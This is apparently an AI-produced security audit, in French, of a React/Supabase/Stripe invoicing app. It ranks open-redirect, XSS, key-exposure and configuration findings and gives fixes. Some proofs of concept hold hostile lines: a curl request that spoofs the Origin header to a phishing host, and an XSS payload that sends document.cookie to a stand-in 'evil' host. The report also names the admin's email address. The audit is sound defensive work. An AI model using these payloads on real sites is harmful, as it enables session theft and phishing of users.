# Audit Sécurité — Factumation — 2026-05-13

## Cartographie

- **Stack** : React 18 + Vite + TypeScript + Supabase (Auth + Postgres + Edge Functions Deno)
- **Frontend** : déployé Vercel (factumation.vercel.app). Pré-rendering 17 pages statiques.
- **Backend** : 6 Edge Functions (`admin`, `send-email`, `create-checkout`, `create-portal`, `stripe-webhook`, `keep-alive`).
- **Tables** : 7 (`blog_posts`, `clients`, `companies`, `invoices`, `quotes`, `subscriptions`, `user_preferences`) — RLS active sur **7/7** ✅
- **Auth** : Supabase Auth (Google OAuth + email/password). Admin unique = `mandaniaina.randriambinintsoa@gmail.com`.
- **Services tiers** : Stripe (paiement), Resend (email transactionnel + broadcast).
- **Storage** : aucun bucket configuré.

## Bilan exécutif

**Aucun finding CRITIQUE exploitable.** Le projet est globalement bien sécurisé : RLS exhaustive, admin check côté serveur, Stripe webhook signature vérifiée, DELETE cascade RGPD complet, secrets server-side bien isolés des Edge Functions.

**3 findings HAUT** à traiter en priorité : Open Redirect sur 2 endpoints Stripe, XSS via interpolation HTML non échappée dans les emails transactionnels, et `GEMINI_API_KEY` injecté dans le bundle (code mort, mais bombe à retardement).

---

## Findings par sévérité

### 🟠 HAUT (3)

#### H1. Open Redirect via header `Origin` — create-checkout & create-portal

**Fichiers** :
- `supabase/functions/create-checkout/index.ts:81`
- `supabase/functions/create-portal/index.ts:53`

**Description** : Le header `Origin` (contrôlé par le client HTTP) est utilisé sans validation pour construire `success_url`, `cancel_url`, et `return_url` passés à Stripe :

```ts
const origin = req.headers.get('origin') || 'https://factumation.vercel.app';
// puis :
success_url: `${origin}/fr/settings?checkout=success`
```

**PoC** :
```bash
curl -X POST "${SUPABASE_URL}/functions/v1/create-checkout" \
  -H "Authorization: Bearer <JWT_USER_LEGITIME>" \
  -H "Origin: https://phishing.evil" \
  -d '{"plan":"pro"}'
# → renvoie une URL Stripe dont le success redirige vers https://phishing.evil/fr/settings?...
```

**Impact** : Attaque de phishing post-checkout. Un attaquant convainc une victime de cliquer un lien, le checkout Stripe est légitime, mais après paiement la victime atterrit sur un site contrôlé par l'attaquant qui imite Factumation.

**Fix** : whitelist des origins autorisés :
```ts
const ALLOWED_ORIGINS = [
  'https://factumation.vercel.app',
  'http://localhost:5173', // dev
];
const reqOrigin = req.headers.get('origin') ?? '';
const origin = ALLOWED_ORIGINS.includes(reqOrigin) ? reqOrigin : 'https://factumation.vercel.app';
```

---

#### H2. XSS dans emails transactionnels — interpolation HTML non échappée

**Fichier** : `supabase/functions/send-email/index.ts:85, 117-145`

**Description** : Les variables user-contrôlées sont injectées brut dans le template HTML envoyé à Resend :
```ts
html = `<h1>${docLabel} ${data.documentNumber}</h1>
        <p>Bonjour <strong>${data.clientName}</strong>,</p>
        ...${data.companyName}${data.companyPhone ? ` | ${data.companyPhone}` : ''}...`;
```

`data.clientName`, `data.companyName`, `data.documentNumber`, etc. proviennent du formulaire facture/devis. Aucun escape.

**PoC** : Un user créé sa "société" avec `companyName = <img src=x onerror="fetch('https://evil/'+document.cookie)">`. À chaque facture envoyée à un client, le HTML s'affiche dans le webmail du destinataire. Les clients mail modernes (Gmail, Outlook) strippent la plupart des `onerror`, mais pas les liens `<a href="https://phishing">` ni les images de tracking.

**Impact** : Phishing inverse (le client de l'user reçoit un email piégé). Atteinte réputationnelle pour Factumation.

**Fix** : Helper escape obligatoire :
```ts
const escapeHtml = (s: string) =>
  String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]!));

// puis dans le template :
<h1>${escapeHtml(docLabel)} ${escapeHtml(data.documentNumber)}</h1>
<p>Bonjour <strong>${escapeHtml(data.clientName)}</strong>,</p>
```

---

#### H3. `GEMINI_API_KEY` injecté dans le bundle client

**Fichier** : `vite.config.ts:13-16`

**Description** :
```ts
define: {
  'process.env.API_KEY': JSON.stringify(env.GEMINI_API_KEY),
  'process.env.GEMINI_API_KEY': JSON.stringify(env.GEMINI_API_KEY)
}
```

Aucun code TypeScript du projet n'utilise `GEMINI_API_KEY` (vérifié via grep — résultats uniquement dans `i18n/*.json`, `README.md`, `GEO-AUDIT-REPORT.md`, `vite.config.ts`).

**État actuel** : `.env` ne définit pas cette variable → `JSON.stringify(undefined)` = `"undefined"` dans le bundle → pas de leak réel **aujourd'hui**.

**Pourquoi HAUT malgré tout** : si demain quelqu'un (Manda ou Claude futur) ajoute `GEMINI_API_KEY=...` dans `.env`, la clé fuite immédiatement dans le bundle public sans aucun signal. C'est un "footgun" prêt à se déclencher.

**Fix** : supprimer ce bloc `define` entier. Si Gemini est jamais utilisé un jour, l'appel doit passer par une Edge Function avec la clé en `Deno.env`, jamais côté client.

---

### 🟡 MOYEN (4)

#### M1. Pas de rate-limit sur `broadcast-email`

**Fichier** : `supabase/functions/admin/index.ts:172-243`

**Description** : Aucune limite par fenêtre temporelle. L'auth admin protège l'endpoint, mais si le JWT admin est compromis (vol session, XSS, fuite via dump browser) un attaquant peut envoyer 500 emails/batch en boucle.

**Mitigations actuelles** ✅ :
- Throttle 600ms entre destinataires d'un même batch.
- Max 500 destinataires par requête.
- Admin check côté serveur.

**Manque** : pas de compteur global par fenêtre 1h.

**Fix** : table `admin_audit_log` + check :
```ts
const oneHourAgo = new Date(Date.now() - 3600_000).toISOString();
const { count } = await adminClient.from('admin_audit_log')
  .select('*', { count: 'exact', head: true })
  .eq('action', 'broadcast-email')
  .gte('created_at', oneHourAgo);
if ((count ?? 0) >= 5) return json({error: 'Rate limit: max 5 broadcasts/h'}, 429);
```

---

#### M2. XSS dans articles blog (admin-controlled, mais sans sanitization)

**Fichier** : `components/BlogPost.tsx:23, 75`

```tsx
<li dangerouslySetInnerHTML={{ __html: formatInline(item) }} />
```

`formatInline()` ne fait que `**bold**` et `*italic*` → injecte `<strong>$1</strong>`. Mais le contenu de `$1` n'est PAS échappé. Un article avec `**<img src=x onerror=...>**` exécute le payload sur la page publique.

**Impact** : L'admin (seul auteur d'articles via `blog_posts` RLS) doit s'auto-attaquer ou voir son compte compromis. Faible probabilité, fort impact (XSS sur factumation.vercel.app = stealer de session Supabase).

**Note** : `BlogPost.tsx:235` `dangerouslySetInnerHTML={{ __html: JSON.stringify(articleSchema) }}` est SAFE (JSON.stringify échappe les balises).

**Fix** : remplacer `formatInline` par `react-markdown` + `rehype-sanitize`, ou échapper avant interpolation :
```ts
const formatInline = (text: string): string => {
  return escapeHtml(text)
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.+?)\*/g, '<em>$1</em>');
};
```

---

#### M3. `dompurify` <=3.3.3 vulnérable (via `html2pdf.js > jspdf`)

**Source** : `pnpm audit`. Advisory [GHSA-39q2-94rc-95cp](https://github.com/advisories/GHSA-39q2-94rc-95cp).

**Description** : Bypass `FORBID_TAGS` via short-circuit dans `ADD_TAGS`. Permet à un attaquant de glisser des balises malveillantes dans le PDF généré.

**Impact** : Limité — html2pdf.js convertit la preview facture (composant React) en PDF côté client. Le HTML source est totalement contrôlé par le user lui-même. Mais si le user veut faire un PDF piégé pour son client, c'est possible.

**Fix** :
```bash
pnpm up html2pdf.js
# ou en override package.json:
"pnpm": { "overrides": { "dompurify": "^3.4.0" } }
```

---

#### M4. Self-XSS admin dans le preview broadcast-email

**Fichier** : `components/admin/AdminUserList.tsx:590`

```tsx
<div dangerouslySetInnerHTML={{ __html: html }} />
```

L'HTML vient d'un textarea de l'admin lui-même. Self-XSS uniquement (l'admin se compromet lui-même).

**Note** : c'est le comportement attendu d'un preview "what you type is what you get". Mais si demain quelqu'un d'autre que l'admin a accès au form (typiquement, autre admin si Manda fait grandir l'équipe), le risque augmente.

**Fix** : utiliser une iframe sandbox au lieu de injection directe :
```tsx
<iframe
  sandbox=""
  srcDoc={html}
  className="border border-slate-200 rounded-lg w-full h-48"
  title="Aperçu email"
/>
```

---

### 🟢 BAS (5)

#### B1. CSP manquant dans vercel.json

`vercel.json` définit `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` ✅ mais pas `Content-Security-Policy`. CSP strict mitige les XSS résiduels (M2, M4) et bloque l'exfiltration vers des origines non whitelistées.

**Fix proposé** (à tester en mode `Content-Security-Policy-Report-Only` d'abord) :
```json
{ "key": "Content-Security-Policy",
  "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://js.stripe.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; connect-src 'self' https://*.supabase.co https://api.stripe.com; frame-src https://js.stripe.com https://checkout.stripe.com; frame-ancestors 'self'; object-src 'none'" }
```

#### B2. `ADMIN_EMAIL` hardcodé

`supabase/functions/admin/index.ts:4` — Pas un secret (l'email est public), mais bonne pratique de migrer en `Deno.env.get('ADMIN_EMAIL')` pour faciliter la rotation.

#### B3. CVE dev-only (fast-uri, postcss via @remotion)

`pnpm audit` signale `fast-uri` (HIGH path traversal) et `postcss` (MODERATE XSS) dans la chaîne `@remotion/cli > @remotion/bundler`. Remotion est utilisé en build local pour générer les vidéos promo, **jamais exécuté en prod**. Impact production = nul.

**Fix** : `pnpm up @remotion/cli @remotion/bundler` quand disponible.

#### B4. Leaked Password Protection désactivé

Advisor Supabase : `auth_leaked_password_protection`. À activer manuellement dans le dashboard Supabase → Authentication → Policies → "Check passwords against HaveIBeenPwned".

#### B5. `SECURITY DEFINER` avec `search_path` mutable

Advisor Supabase signale `update_blog_posts_updated_at` et `handle_new_user_subscription`. Risque théorique de hijacking via objets injectés dans un schema temporaire. Pas exploitable en l'état (les fonctions sont des triggers internes), mais bonne pratique :
```sql
ALTER FUNCTION public.handle_new_user_subscription() SET search_path = public, pg_temp;
ALTER FUNCTION public.update_blog_posts_updated_at() SET search_path = public, pg_temp;
```

---

## Sécurités validées (rien à faire) ✅

- **RLS** : active sur 7/7 tables. Toutes les policies sont scoped à `auth.uid() = user_id` ou à l'email admin.
- **Subscriptions** : aucune policy UPDATE pour les users → seul `service_role` (Edge Functions) peut modifier. Excellent design — un user ne peut pas se passer Pro en bidouillant le client.
- **Stripe webhook** : signature `stripe.webhooks.constructEvent()` vérifiée AVANT traitement (`stripe-webhook/index.ts:34`).
- **Admin** : double vérification (UI cache + Edge function `user.email === ADMIN_EMAIL`).
- **DELETE cascade RGPD** : toutes les 6 tables avec FK vers `auth.users` ont `ON DELETE CASCADE`. Suppression d'un user → suppression complète de ses données. Conformité RGPD OK.
- **`.env` non versionné** : `.gitignore` contient `.env`. Seul `.env.example` est tracké.
- **Secrets server-only** : aucun `SERVICE_ROLE_KEY`, `STRIPE_SECRET_KEY`, `RESEND_API_KEY` exposé côté client. Tous dans `Deno.env.get(...)` côté Edge Functions.
- **CORS** : `*` sur Edge Functions, acceptable car l'auth se fait via Authorization header (pas via cookie) — pas de CSRF possible.
- **Logs** : aucun `console.log` de credentials/PII trouvé.

---

## Faux positifs écartés

Les findings ci-dessous ont été suspectés par les sous-agents et invalidés après vérification :

| Faux positif | Pourquoi invalidé |
|---|---|
| RLS UPDATE permet de swap `user_id` vers un autre user | Postgres fait `with_check ← qual` quand `with_check` est NULL. La nouvelle ligne est vérifiée. Confirmé via `pg_policies`. |
| `.env` versionné avec secrets | `git ls-files` ne retourne que `.env.example`. `.gitignore` contient `.env`. |
| `VITE_BREVO_API_KEY` côté client | Aucune référence dans le code TS (uniquement dans i18n/README/GEO-audit en tant que mention historique). Probablement supprimé d'une ancienne intégration. |
| `BlogPost.tsx:235` XSS via articleSchema | `JSON.stringify` échappe les `<` et `>`. Safe. |
| Stack trace verbeux exposé client | `(err as Error).message` est limité au message court, pas la stack complète. Sévérité réduite à BAS. |

---

## À faire manuellement (hors scope code)

1. **Activer "Leaked password protection"** dans Supabase Dashboard (B4).
2. **Activer MFA** sur le compte admin Supabase et le compte Stripe (pas vérifié, mais prudent).
3. **Vérifier la rotation des secrets** : `SUPABASE_SERVICE_ROLE_KEY`, `STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET`, `RESEND_API_KEY` — quand ont-ils été rotates pour la dernière fois ?
4. **Politique de confidentialité + CGU** : flag `[CRITICAL]` déjà dans MEMORY.md. Légalement obligatoire avant prod commerciale (RGPD art. 13).
5. **Souscrire un monitoring** : Sentry frontend + Supabase logs. Actuellement aucune visibilité sur les erreurs en prod.

---

## Priorité de résolution suggérée

| # | Sévérité | Finding | Effort | Impact |
|---|---|---|---|---|
| 1 | HAUT | H1 — Open Redirect Stripe | ~10 min | Phishing post-paiement |
| 2 | HAUT | H2 — XSS emails transactionnels | ~15 min | Atteinte réputation |
| 3 | HAUT | H3 — GEMINI_API_KEY footgun | ~2 min | Future fuite clé |
| 4 | MOY | M2 — XSS blog | ~30 min | XSS si admin compromis |
| 5 | MOY | M1 — Rate-limit broadcast | ~30 min | Spam si admin compromis |
| 6 | MOY | M3 — Upgrade dompurify | ~5 min | XSS PDF |
| 7 | MOY | M4 — Iframe sandbox preview | ~5 min | Self-XSS admin |
| 8 | BAS | B1 — CSP | ~1h (test) | Mitigation transverse |
| 9 | BAS | B2-B5 | varié | Hygiène |

**Recommandation** : fixer H1+H2+H3 en un commit ce soir (peut être fait sous 30 min). Les MOYEN dans la semaine. Les BAS en backlog.

---

*Audit produit par Claude Code (security-audit skill) le 2026-05-13. Méthode : MCP Supabase pour vérifs DB live, sous-agents Explore parallèles pour code statique, validation systématique des findings contre la prod.*
